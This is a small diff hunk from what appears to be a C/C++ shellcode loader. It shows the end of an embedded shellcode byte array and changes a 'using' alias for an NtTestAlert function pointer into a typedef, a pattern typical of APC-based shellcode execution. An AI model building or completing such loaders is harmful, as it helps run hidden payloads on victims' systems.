@@ -39,7 +39,7 @@ unsigned char buf[] =
 	"\xc1\x8e\x5a\x2a\x37\xcb\x06\x1d\xd8\x7c\xce\xa0\x42\x97\xfc"
 	"\xd3\x11\xf1\x74\xca\x42\xce\xbd";
 
-using myNtTestAlert = NTSTATUS(NTAPI *)();
+typedef NTSTATUS(NTAPI *myNtTestAlert)();
 
 int main(int argc, char *argv[])
 {
